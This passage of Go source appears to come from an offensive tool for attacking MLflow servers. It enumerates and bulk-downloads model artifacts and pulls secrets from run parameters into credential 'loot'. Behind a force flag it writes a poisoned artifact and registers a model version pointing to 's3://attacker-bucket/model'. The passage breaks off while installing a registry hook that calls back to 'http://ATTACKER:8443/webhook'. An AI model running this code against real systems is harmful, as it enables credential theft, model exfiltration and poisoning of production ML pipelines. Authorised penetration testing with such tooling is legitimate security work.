	for _, v := range versions {
		versionLines = append(versionLines, fmt.Sprintf("%s v%s stage=%s source=%s run_id=%s",
			v.Model, v.Version, v.Stage, v.Source, v.RunID))
	}
	findings[0].Evidence = strings.Join(versionLines, "\n")
	if len(versions) > 0 {
		summaryPlan := buildMLflowModelVersionWorkflowPlan(mlflowTarget, mlflowModel, versions[0].Version)
		findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
		for _, version := range versions {
			finding := newExploitFinding(
				report.SourceMLflow,
				mlflowTarget,
				fmt.Sprintf("MLflow model version discovered: %s:%s", safeLabel(version.Model), safeLabel(version.Version)),
				report.SeverityInfo,
				fmt.Sprintf("Model %s version %s is in stage %s and sources %s", safeLabel(version.Model), safeLabel(version.Version), safeLabel(version.Stage), safeLabel(version.Source)),
				map[string]interface{}{
					"module":   "mlflow",
					"action":   "model-versions",
					"mutating": false,
					"provider": "mlflow",
					"model":    version.Model,
					"version":  version.Version,
					"stage":    version.Stage,
					"run_id":   version.RunID,
					"source":   version.Source,
				},
			)
			finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "mlflow-model-versions", "model-version")
			finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowModelVersionWorkflowPlan(mlflowTarget, version.Model, version.Version))
			findings = append(findings, finding)
		}
		return writeExploitFindingsWithSummary(findings, &exploitSummary{
			Module:              "mlflow",
			Action:              "model-versions",
			ResourcesEnumerated: len(versions),
			PartialFailures:     0,
			Mutating:            false,
			WorkflowPlans:       []workflowPlan{summaryPlan},
		})
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "model-versions",
		ResourcesEnumerated: 0,
		PartialFailures:     0,
		Mutating:            false,
	})
}

func runMLflowModelArtifacts(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(mlflowModel) == "" {
		return missingFlagError("model", formatCommandExample("mlflow --target http://127.0.0.1:5000 model-artifacts --model demo-model --version 3"))
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	versions, err := client.ListModelVersions(mlflowModel, mlflowLimit)
	if err != nil {
		return fmt.Errorf("listing model versions: %w", err)
	}
	version, err := selectMLflowModelVersion(versions, mlflowVersion)
	if err != nil {
		return err
	}
	runID, prefix := parseMLflowSourceURI(version.Source)
	if runID == "" {
		runID = version.RunID
	}
	entries := make([]mlflow.ArtifactEntry, 0)
	if runID != "" {
		entries, err = client.ListArtifacts(runID, prefix, mlflowLimit)
		if err != nil {
			return fmt.Errorf("listing model artifacts: %w", err)
		}
	}

	var runSensitiveFindings []report.Finding
	if runID != "" {
		// Search across all visible experiments so a backing run in a named (non-default)
		// experiment is found — an unscoped ListRuns("") would silently miss it.
		runRuns, runErr := client.ListRunsAllVisible(100)
		if runErr == nil {
			for _, r := range runRuns {
				if r.ID == runID {
					sensitiveParams := mlflow.ExtractSensitiveData(r.Params, r.Tags, r.ArtifactURI)
					for _, sp := range sensitiveParams {
						sf := newExploitFinding(
							report.SourceMLflow,
							mlflowTarget,
							fmt.Sprintf("MLflow sensitive data in run %s: %s", safeLabel(runID), sp.Reason),
							report.SeverityHigh,
							fmt.Sprintf("Run %s exposes %s via %q", safeLabel(runID), sp.Reason, sp.Key),
							map[string]interface{}{
								"module":         "mlflow",
								"action":         "model-artifacts",
								"mutating":       false,
								"provider":       "mlflow",
								"run_id":         runID,
								"param_key":      sp.Key,
								"sensitive_type": sp.Reason,
								"stage":          "impact",
								"landed":         "read-confirmed",
							},
						)
						sf.Evidence = sp.Value
						sf.Metadata["extracted_credentials"] = lootCredentialRecord(mlflowSecretCredType(sp.Value), sp.Key, sp.Value, mlflowTarget, fmt.Sprintf("run %s, %s", safeLabel(runID), sp.Reason))
						runSensitiveFindings = append(runSensitiveFindings, sf)
					}
					break
				}
			}
		}
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			fmt.Sprintf("MLflow model artifact chain resolved: %s:%s", safeLabel(version.Model), safeLabel(version.Version)),
			report.SeverityHigh,
			fmt.Sprintf("Resolved model %s version %s to source %s", safeLabel(version.Model), safeLabel(version.Version), safeLabel(version.Source)),
			map[string]interface{}{
				"module":   "mlflow",
				"action":   "model-artifacts",
				"mutating": false,
				"provider": "mlflow",
				"model":    version.Model,
				"version":  version.Version,
				"run_id":   runID,
				"source":   version.Source,
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "impact", "reachable", "mlflow-model-artifacts", "model-artifacts")
	summaryPlan := buildMLflowModelArtifactsSummaryWorkflowPlan(mlflowTarget, version.Model, version.Version, runID, prefix)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	var paths []string
	for _, e := range entries {
		paths = append(paths, e.Path)
	}
	findings[0].Evidence = strings.TrimSpace(version.Source)
	if prev := joinPreview(paths, 40); prev != "" {
		if findings[0].Evidence != "" {
			findings[0].Evidence += "\n" + prev
		} else {
			findings[0].Evidence = prev
		}
	}
	for _, entry := range entries {
		// Listing an artifact PATH proves it exists and is reachable, not that its
		// content was read or executed — so classify kind/hints for context but keep
		// the proof at the honest listing floor (discovery/reachable). A stronger
		// strength requires actually downloading/previewing the artifact body.
		kind, hints, _ := classifyArtifactPreview(entry.Path, "")
		finding := newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			fmt.Sprintf("MLflow model artifact discovered: %s", safeLabel(entry.Path)),
			report.SeverityInfo,
			fmt.Sprintf("Model artifact path %s (dir=%t size=%d)", safeLabel(entry.Path), entry.IsDir, entry.Size),
			map[string]interface{}{
				"module":            "mlflow",
				"action":            "model-artifacts",
				"mutating":          false,
				"provider":          "mlflow",
				"model":             version.Model,
				"version":           version.Version,
				"run_id":            runID,
				"artifact_path":     entry.Path,
				"artifact_kind":     kind,
				"sensitivity_hints": strings.Join(hints, ","),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "mlflow-model-artifacts", "model-artifact")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowModelArtifactsSummaryWorkflowPlan(mlflowTarget, version.Model, version.Version, runID, entry.Path))
		findings = append(findings, finding)
	}
	findings = append(findings, runSensitiveFindings...)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "model-artifacts",
		ResourcesEnumerated: len(entries) + len(runSensitiveFindings),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runMLflowDownloadArtifact(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(mlflowRunID) == "" {
		return missingFlagError("run-id", formatCommandExample("mlflow --target http://127.0.0.1:5000 download-artifact --run-id run-1 --artifact-path model/MLmodel"))
	}
	if strings.TrimSpace(mlflowArtifactPath) == "" {
		return missingFlagError("artifact-path", formatCommandExample("mlflow --target http://127.0.0.1:5000 download-artifact --run-id run-1 --artifact-path model/MLmodel"))
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	body, truncated, err := client.DownloadArtifact(mlflowRunID, mlflowArtifactPath, 256*1024)
	if err != nil {
		return fmt.Errorf("downloading mlflow artifact: %w", err)
	}
	kind, hints, _ := classifyArtifactPreview(mlflowArtifactPath, body)
	strength := mlflowArtifactReadLanded(kind, hints)
	finding := newExploitFinding(
		report.SourceMLflow,
		mlflowTarget,
		fmt.Sprintf("MLflow artifact readable: %s", mlflowArtifactPath),
		report.SeverityHigh,
		fmt.Sprintf("Artifact path %s was readable for run %s", mlflowArtifactPath, mlflowRunID),
		map[string]interface{}{
			"module":            "mlflow",
			"action":            "download-artifact",
			"mutating":          false,
			"provider":          "mlflow",
			"run_id":            mlflowRunID,
			"artifact_path":     mlflowArtifactPath,
			"artifact_kind":     kind,
			"sensitivity_hints": strings.Join(hints, ","),
		},
	)
	finding.Evidence = body
	if truncated {
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = int64(256 * 1024)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", strength, "mlflow-download-artifact", "artifact-read")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowDownloadArtifactSummaryWorkflowPlan(mlflowTarget, mlflowRunID, mlflowArtifactPath))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "mlflow",
		Action:              "download-artifact",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{buildMLflowDownloadArtifactSummaryWorkflowPlan(mlflowTarget, mlflowRunID, mlflowArtifactPath)},
	})
}

func runMLflowUploadArtifact(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("mlflow upload-artifact"); err != nil {
		return err
	}
	artifactPath := strings.TrimSpace(mlflowArtifactPath)
	if artifactPath == "" {
		artifactPath = "aipostex-write/poisoned-artifact.txt"
	}
	content := []byte("aipostex-poisoned-artifact-marker\nunauthenticated MLflow artifact-store write proof\n")
	if raw := strings.TrimSpace(mlflowArtifactContent); raw != "" {
		decoded, decErr := base64.StdEncoding.DecodeString(raw)
		if decErr != nil {
			return fmt.Errorf("decoding --artifact-content: %w", decErr)
		}
		content = decoded
	}
	const artifactByteCap = 256 * 1024
	if len(content) > artifactByteCap {
		return fmt.Errorf("--artifact-content exceeds the %d-byte cap (%d bytes); upload-artifact is a bounded write proof", artifactByteCap, len(content))
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}

	uploadStatus, uploadErr := client.UploadArtifact(artifactPath, content)
	verified := false
	readStatus := 0
	if uploadErr == nil {
		readBack, rs, _ := client.DownloadProxyArtifact(artifactPath, artifactByteCap)
		readStatus = rs
		verified = bytes.Equal(readBack, content)
	}

	// Honesty: a confirmed read-back proves an unauthenticated WRITE to the artifact
	// store (impact/influenced); an accepted-but-unverified or rejected write stays
	// impact/reachable. This NEVER claims execution/own/takeover — no downstream model
	// load is observed (the same honest ceiling as swap-model).
	stage, landed := "impact", "reachable"
	severity := report.SeverityMedium
	title := fmt.Sprintf("MLflow artifact write not confirmed: %s", artifactPath)
	desc := fmt.Sprintf("Artifact write to the MLflow proxied-artifact store at %s was not confirmed (upload status=%d).", artifactPath, uploadStatus)
	if verified {
		stage, landed = "impact", "influenced"
		severity = report.SeverityHigh
		title = fmt.Sprintf("MLflow unauthenticated artifact write confirmed: %s", artifactPath)
		desc = fmt.Sprintf("Wrote %d bytes to the MLflow proxied-artifact store at %s and read them back byte-for-byte — an unauthenticated write to the artifact store. Downstream model load/execution is NOT proven.", len(content), artifactPath)
	} else if uploadErr == nil {
		title = fmt.Sprintf("MLflow artifact write accepted but unverified: %s", artifactPath)
		desc = fmt.Sprintf("The proxied-artifact store accepted the write to %s (status=%d) but the read-back did not match (status=%d).", artifactPath, uploadStatus, readStatus)
	}

	meta := map[string]interface{}{
		"module":         "mlflow",
		"action":         "upload-artifact",
		"mutating":       true,
		"provider":       "mlflow",
		"artifact_path":  artifactPath,
		"artifact_bytes": len(content),
		"upload_status":  uploadStatus,
		"verified":       verified,
	}
	if uploadErr != nil {
		meta["upload_error"] = uploadErr.Error()
	}
	finding := newExploitFinding(report.SourceMLflow, mlflowTarget, title, severity, desc, meta)
	contentPreview := content
	if len(contentPreview) > 2*1024 {
		contentPreview = contentPreview[:2*1024]
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = 2 * 1024
	}
	finding.Evidence = fmt.Sprintf("PUT /api/2.0/mlflow-artifacts/artifacts/%s -> %d\nbytes=%d verified=%t\ncontent=%s",
		artifactPath, uploadStatus, len(content), verified, string(contentPreview))
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "mlflow-upload-artifact", "artifact-write")
	plan := buildMLflowUploadArtifactWorkflowPlan(mlflowTarget, artifactPath, stage, landed)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)

	partial := 0
	if !verified {
		partial = 1
	}
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "mlflow",
		Action:              "upload-artifact",
		ResourcesEnumerated: 1,
		PartialFailures:     partial,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

type mlflowBulkDownloadTarget struct {
	runID      string
	pathPrefix string
	model      string
	version    string
	source     string
}

func resolveMLflowBulkDownloadTarget(client *mlflow.Client) (mlflowBulkDownloadTarget, error) {
	if strings.TrimSpace(mlflowRunID) != "" {
		return mlflowBulkDownloadTarget{
			runID:      strings.TrimSpace(mlflowRunID),
			pathPrefix: strings.Trim(strings.TrimSpace(mlflowArtifactPrefix), "/"),
		}, nil
	}
	if strings.TrimSpace(mlflowModel) == "" {
		return mlflowBulkDownloadTarget{}, fmt.Errorf("either --run-id or --model is required; e.g. %s", formatCommandExample("mlflow --target http://127.0.0.1:5000 bulk-download --run-id run-1 --path-prefix model --force-exploit"))
	}

	versions, err := client.ListModelVersions(mlflowModel, 100)
	if err != nil {
		return mlflowBulkDownloadTarget{}, fmt.Errorf("listing model versions: %w", err)
	}
	version, err := selectMLflowModelVersion(versions, mlflowVersion)
	if err != nil {
		return mlflowBulkDownloadTarget{}, err
	}

	runID, prefix := parseMLflowSourceURI(version.Source)
	if runID == "" {
		runID = version.RunID
	}
	if strings.TrimSpace(mlflowArtifactPrefix) != "" {
		prefix = strings.Trim(strings.TrimSpace(mlflowArtifactPrefix), "/")
	}
	if strings.TrimSpace(runID) == "" {
		return mlflowBulkDownloadTarget{}, fmt.Errorf("model %s version %s did not expose a run_id or runs:/ source", safeLabel(version.Model), safeLabel(version.Version))
	}
	return mlflowBulkDownloadTarget{
		runID:      strings.TrimSpace(runID),
		pathPrefix: strings.Trim(strings.TrimSpace(prefix), "/"),
		model:      version.Model,
		version:    version.Version,
		source:     version.Source,
	}, nil
}

func mlflowLandedRank(value string) int {
	switch strings.TrimSpace(value) {
	case "takeover-capable":
		return 5
	case "execution-confirmed":
		return 4
	case "read-confirmed":
		return 3
	case "influenced":
		return 2
	case "reachable":
		return 1
	default:
		return 0
	}
}

func mlflowArtifactSeverity(landed string) string {
	switch strings.TrimSpace(landed) {
	case "takeover-capable":
		return report.SeverityCritical
	case "execution-confirmed", "read-confirmed":
		return report.SeverityHigh
	default:
		return report.SeverityInfo
	}
}

func mlflowArtifactReadLanded(kind string, hints []string) string {
	kind = strings.TrimSpace(kind)
	if kind == "model-artifact" || kind == "model-metadata" {
		return "takeover-capable"
	}
	for _, hint := range hints {
		if strings.TrimSpace(hint) == "model-material" {
			return "takeover-capable"
		}
	}
	return "read-confirmed"
}

func runMLflowBulkDownload(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("mlflow bulk-download"); err != nil {
		return err
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	target, err := resolveMLflowBulkDownloadTarget(client)
	if err != nil {
		return err
	}

	maxFiles := mlflowBulkMaxFiles
	if maxFiles <= 0 {
		maxFiles = 25
	}
	maxBytes := mlflowBulkMaxBytes
	if maxBytes <= 0 {
		maxBytes = 1024 * 1024
	}
	perFile := mlflowBulkPerFile
	if perFile <= 0 {
		perFile = 256 * 1024
	}

	files, failures, err := client.ListArtifactsRecursive(target.runID, target.pathPrefix, maxFiles)
	if err != nil {
		return fmt.Errorf("listing MLflow artifacts recursively: %w", err)
	}

	type downloadedArtifact struct {
		entry     mlflow.ArtifactEntry
		body      string
		truncated bool
		kind      string
		hints     []string
		landed    string
	}
	var results []downloadedArtifact
	var totalBytes int64
	strongest := "reachable"

	for _, entry := range files {
		if len(results) >= maxFiles || totalBytes >= maxBytes {
			break
		}
		remaining := maxBytes - totalBytes
		if remaining <= 0 {
			break
		}
		limit := perFile
		if remaining < limit {
			limit = remaining
		}
		body, truncated, err := client.DownloadArtifact(target.runID, entry.Path, limit)
		if err != nil {
			failures++
			infof("[mlflow bulk-download] failed to download %s: %v", entry.Path, err)
			continue
		}
		totalBytes += int64(len(body))
		kind, hints, _ := classifyArtifactPreview(entry.Path, body)
		landed := mlflowArtifactReadLanded(kind, hints)
		if mlflowLandedRank(landed) > mlflowLandedRank(strongest) {
			strongest = landed
		}
		results = append(results, downloadedArtifact{
			entry:     entry,
			body:      body,
			truncated: truncated,
			kind:      kind,
			hints:     hints,
			landed:    landed,
		})
	}

	var findings []report.Finding
	var downloadedPaths []string
	for _, result := range results {
		downloadedPaths = append(downloadedPaths, result.entry.Path)
		finding := newExploitFinding(
			report.SourceMLflow,
			mlflowTarget,
			fmt.Sprintf("MLflow artifact bulk downloaded: %s", safeLabel(result.entry.Path)),
			mlflowArtifactSeverity(result.landed),
			fmt.Sprintf("Bulk downloaded artifact %s from run %s (%d bytes read, truncated=%t)", safeLabel(result.entry.Path), safeLabel(target.runID), len(result.body), result.truncated),
			map[string]interface{}{
				"module":            "mlflow",
				"action":            "bulk-download",
				"mutating":          false,
				"provider":          "mlflow",
				"run_id":            target.runID,
				"artifact_path":     result.entry.Path,
				"artifact_kind":     result.kind,
				"sensitivity_hints": strings.Join(result.hints, ","),
				"bulk":              true,
				"bytes_read":        len(result.body),
				"model":             target.model,
				"version":           target.version,
			},
		)
		if result.truncated {
			finding.Metadata["evidence_truncated"] = true
			finding.Metadata["evidence_limit_bytes"] = int64(len(result.body))
		}
		finding.Evidence = result.body
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", result.landed, "mlflow-bulk-download", "artifact-read")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildMLflowBulkDownloadWorkflowPlan(mlflowTarget, target.runID, target.model, target.version, result.entry.Path))
		findings = append(findings, finding)
	}

	summarySeverity := report.SeverityInfo
	summaryLanded := "reachable"
	if len(results) > 0 {
		summarySeverity = mlflowArtifactSeverity(strongest)
		summaryLanded = strongest
	}
	summary := newExploitFinding(
		report.SourceMLflow,
		mlflowTarget,
		fmt.Sprintf("MLflow bulk artifact download summary: %d file(s)", len(results)),
		summarySeverity,
		fmt.Sprintf("Bulk artifact download from run %s yielded %d file(s), %s total, %d failure(s).", safeLabel(target.runID), len(results), humanBytes(totalBytes), failures),
		map[string]interface{}{
			"module":       "mlflow",
			"action":       "bulk-download",
			"mutating":     false,
			"provider":     "mlflow",
			"run_id":       target.runID,
			"path_prefix":  target.pathPrefix,
			"files_found":  len(results),
			"total_bytes":  totalBytes,
			"failures":     failures,
			"bulk":         true,
			"model":        target.model,
			"version":      target.version,
			"model_source": target.source,
		},
	)
	summary.Evidence = strings.Join(downloadedPaths, "\n")
	summary.Metadata = applyStageLanded(summary.Metadata, "impact", summaryLanded, "mlflow-bulk-download", "bulk-artifact-read")

	var plans []workflowPlan
	if len(results) > 0 {
		plan := buildMLflowBulkDownloadWorkflowPlan(mlflowTarget, target.runID, target.model, target.version, results[0].entry.Path)
		summary.Metadata = attachWorkflowToMetadata(summary.Metadata, plan)
		plans = append(plans, plan)
	}
	findings = append(findings, summary)

	infof("MLflow bulk download complete: %d file(s), %s", len(results), humanBytes(totalBytes))
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "mlflow",
		Action:              "bulk-download",
		ResourcesEnumerated: len(results),
		PartialFailures:     failures,
		Mutating:            false,
		WorkflowPlans:       plans,
	})
}

func runMLflowTamperProof(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("mlflow tamper-proof"); err != nil {
		return err
	}
	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}
	// Reuse a single fixed proof experiment (get-or-create) rather than minting a
	// timestamped one per run — repeated proof runs otherwise accumulate dozens of
	// experiments on the tracking server, cluttering it and slowing per-experiment
	// enumeration. Write access is still proven by the new run + logged parameter.
	experimentName := "aipostex-tamper-proof"
	experimentID, runID, err := client.TamperProof(experimentName)
	if err != nil {
		return fmt.Errorf("tamper proof: %w", err)
	}

	evidence := fmt.Sprintf("Chain:    POST /experiments/create -> POST /runs/create -> POST /runs/log-parameter\nExperiment: %s (ID: %s)\nRun: %s\nParameter: aipostex_proof=tampering_demonstrated\nResult: ML pipeline artifact write access confirmed", experimentName, experimentID, runID)

	finding := newExploitFinding(
		report.SourceMLflow,
		mlflowTarget,
		"MLflow tracking-server write access confirmed",
		report.SeverityHigh,
		fmt.Sprintf("Created experiment %s with run %s and logged a parameter. Write access to the MLflow tracking server is confirmed (a state-changing write — not code execution on the host, and no existing pipeline was tampered).", safeLabel(experimentName), safeLabel(runID)),
		map[string]interface{}{
			"module":        "mlflow",
			"action":        "tamper-proof",
			"mutating":      true,
			"provider":      "mlflow",
			"experiment":    experimentName,
			"experiment_id": experimentID,
			"run_id":        runID,
			"artifact":      true,
		},
	)
	finding.Evidence = evidence
	// A successful create-experiment + log-parameter is a confirmed state-changing WRITE,
	// not code execution and not takeover of an existing pipeline. Honest: impact/influenced.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "mlflow-tamper-proof", "artifact")
	plan := workflowPlan{
		Target:      canonicalServiceURL(mlflowTarget),
		Stage:       "proof",
		Landed:      "influenced",
		ChainSource: "mlflow-tamper-proof",
		Rationale:   "Write access to MLflow tracking server confirmed; artifact store may be accessible.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+canonicalServiceURL(mlflowTarget)+" artifacts --run-id "+runID), "List artifacts in the proof run to verify artifact store access.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+canonicalServiceURL(mlflowTarget)+" registry"), "Enumerate registered models for lateral movement opportunities.", false, 20),
		},
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	infof("Tamper proof succeeded: experiment=%s run=%s", experimentName, runID)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "mlflow",
		Action:              "tamper-proof",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func newMLflowClient() (*mlflow.Client, http.Header, error) {
	if strings.TrimSpace(mlflowTarget) == "" {
		return nil, nil, missingFlagError("target", formatCommandExample("mlflow --target http://127.0.0.1:5000 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(mlflowHeaders)
	if err != nil {
		return nil, nil, err
	}
	target := normalizeAndWarnTarget(mlflowTarget)
	mlflowTarget = target
	client, err := mlflow.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, nil, err
	}
	client.HTTPClient = httpClient
	client.ForceExploit = cfg.ForceExploit
	return client, headers, nil
}

func filterExperiments(values []mlflow.Experiment, filter string) []mlflow.Experiment {
	if strings.TrimSpace(filter) == "" {
		return values
	}
	filter = strings.TrimSpace(filter)
	filtered := make([]mlflow.Experiment, 0, len(values))
	for _, value := range values {
		if value.ID == filter || value.Name == filter {
			filtered = append(filtered, value)
		}
	}
	return filtered
}

func resolveMLflowExperimentID(client *mlflow.Client, filter string) (string, error) {
	if strings.TrimSpace(filter) == "" {
		return "", nil
	}
	experiments, err := client.ListExperiments(mlflowLimit)
	if err != nil {
		return "", err
	}
	filtered := filterExperiments(experiments, filter)
	if len(filtered) == 0 {
		return "", fmt.Errorf("no MLflow experiment matched %q", filter)
	}
	return filtered[0].ID, nil
}

func collectExperimentNames(values []mlflow.Experiment) []string {
	out := make([]string, 0, len(values))
	for _, value := range values {
		out = append(out, value.Name)
	}
	return out
}

func collectRunIDs(values []mlflow.Run) []string {
	out := make([]string, 0, len(values))
	for _, value := range values {
		out = append(out, value.ID)
	}
	return out
}

func mapKeys(values map[string]string) []string {
	keys := make([]string, 0, len(values))
	for key := range values {
		keys = append(keys, key)
	}
	return keys
}

func selectMLflowModelVersion(values []mlflow.ModelVersion, wanted string) (mlflow.ModelVersion, error) {
	if len(values) == 0 {
		return mlflow.ModelVersion{}, fmt.Errorf("no model versions returned")
	}
	if strings.TrimSpace(wanted) == "" {
		return values[0], nil
	}
	for _, value := range values {
		if value.Version == strings.TrimSpace(wanted) {
			return value, nil
		}
	}
	return mlflow.ModelVersion{}, fmt.Errorf("no model version matched %q", wanted)
}

func parseMLflowSourceURI(raw string) (runID string, pathPrefix string) {
	raw = strings.TrimSpace(raw)
	if strings.HasPrefix(raw, "runs:/") {
		remainder := strings.TrimPrefix(raw, "runs:/")
		parts := strings.SplitN(strings.TrimLeft(remainder, "/"), "/", 2)
		runID = parts[0]
		if len(parts) > 1 {
			pathPrefix = parts[1]
		}
	}
	return runID, pathPrefix
}

func runMLflowSwapModel(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("mlflow swap-model"); err != nil {
		return err
	}
	if strings.TrimSpace(mlflowModel) == "" {
		return missingFlagError("model", formatCommandExample("mlflow --target http://127.0.0.1:5000 swap-model --model demo-model --source s3://attacker-bucket/model --force-exploit"))
	}
	if strings.TrimSpace(mlflowSwapSource) == "" {
		return missingFlagError("source", formatCommandExample("mlflow --target http://127.0.0.1:5000 swap-model --model demo-model --source s3://attacker-bucket/model --force-exploit"))
	}

	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}

	// Enumerate existing versions to record what we're displacing.
	existingVersions, _ := client.ListModelVersions(mlflowModel, 5)
	var priorVersion string
	var priorSource string
	if len(existingVersions) > 0 {
		priorVersion = existingVersions[0].Version
		priorSource = existingVersions[0].Source
	}

	newVersion, err := client.CreateModelVersion(mlflowModel, mlflowSwapSource)
	if err != nil {
		return fmt.Errorf("swap-model: %w", err)
	}

	evidence := fmt.Sprintf("Chain:    POST /model-versions/create\nModel: %s\nNew version: %s\nAttacker source: %s",
		mlflowModel, newVersion, mlflowSwapSource)
	if priorVersion != "" {
		evidence += fmt.Sprintf("\nPrior version: %s\nPrior source: %s", priorVersion, priorSource)
	}

	finding := newExploitFinding(
		report.SourceMLflow,
		mlflowTarget,
		fmt.Sprintf("MLflow model registry version created pointing to attacker source: %s v%s", safeLabel(mlflowModel), newVersion),
		report.SeverityCritical,
		fmt.Sprintf("Registered new version %s for model %s pointing to attacker-controlled artifact source %s. Serving pipelines that pull latest would load the swapped artifact — registry write confirmed, served execution not verified.",
			safeLabel(newVersion), safeLabel(mlflowModel), safeLabel(mlflowSwapSource)),
		map[string]interface{}{
			"module":        "mlflow",
			"action":        "swap-model",
			"mutating":      true,
			"provider":      "mlflow",
			"model":         mlflowModel,
			"new_version":   newVersion,
			"swap_source":   mlflowSwapSource,
			"prior_version": priorVersion,
			"prior_source":  priorSource,
		},
	)
	finding.Evidence = evidence
	// A registry version pointing at attacker source is a landed mutation (impact/
	// influenced); it does not prove the model was loaded, served, or executed.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "mlflow-swap-model", "artifact")
	plan := workflowPlan{
		Target:      canonicalServiceURL(mlflowTarget),
		Stage:       "impact",
		Landed:      "influenced",
		ChainSource: "mlflow-swap-model",
		Rationale:   "Model version registered with attacker artifact source; registry write confirmed, downstream serving hijack unverified.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+canonicalServiceURL(mlflowTarget)+" model-versions --model "+mlflowModel), "Verify the new version appears in the registry.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+canonicalServiceURL(mlflowTarget)+" hook --model "+mlflowModel+" --version "+newVersion+" --callback-url http://ATTACKER:8443/webhook --force-exploit"), "If registry hook automation is in scope, test whether the new version can drive downstream hook delivery.", true, 20),
		},
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	infof("Swap model succeeded: model=%s version=%s source=%s", mlflowModel, newVersion, mlflowSwapSource)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "mlflow",
		Action:              "swap-model",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runMLflowHook(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("mlflow hook"); err != nil {
		return err
	}
	if strings.TrimSpace(mlflowModel) == "" {
		return missingFlagError("model", formatCommandExample("mlflow --target http://127.0.0.1:5000 hook --model demo-model --version 1 --callback-url http://ATTACKER:8443/webhook --force-exploit"))
	}
	if strings.TrimSpace(cfg.CallbackURL) == "" {
		return missingFlagError("callback-url", formatCommandExample("mlflow --target http://127.0.0.1:5000 hook --model demo-model --version 1 --callback-url http://ATTACKER:8443/webhook --force-exploit"))
	}
	if !isHTTPCallbackURL(cfg.CallbackURL) {
		return fmt.Errorf("--callback-url must be an HTTP(S) URL for mlflow hook (got %q)", cfg.CallbackURL)
	}

	client, _, err := mlflowClientFactory()
	if err != nil {
		return err
	}

	version := strings.TrimSpace(mlflowVersion)
	if version == "" {
		versions, err := client.ListModelVersions(mlflowModel, 1)
		if err != nil {
			return fmt.Errorf("resolving model version for hook: %w", err)
		}
		selected, err := selectMLflowModelVersion(versions, "")
		if err != nil {
			return err
		}
		version = selected.Version
	}

	tagKey := strings.TrimSpace(mlflowHookTagKey)
	if tagKey == "" {
		tagKey = "aipostex.hook.url"
	}

	var (
		result               mlflow.HookInstallResult
		submittedCallbackURL = strings.TrimSpace(cfg.CallbackURL)
	)
	hit, err := confirmOOBCallback(currentContext(), cfg.CallbackURL, oobConfirmWait, func(registerURL string) error {
		submittedCallbackURL = registerURL
		var installErr error
		result, installErr = client.InstallModelVersionHook(mlflowModel, version, tagKey, registerURL)
		return installErr
	})
	if err != nil {
		return fmt.Errorf("installing MLflow hook metadata: %w", err)
	}

	callbackConfirmed := hit != nil
	severity := report.SeverityHigh
	stage := "impact"
	landed := "influenced"
	title := fmt.Sprintf("MLflow model-version hook metadata written: %s v%s", safeLabel(result.Model), safeLabel(result.Version))
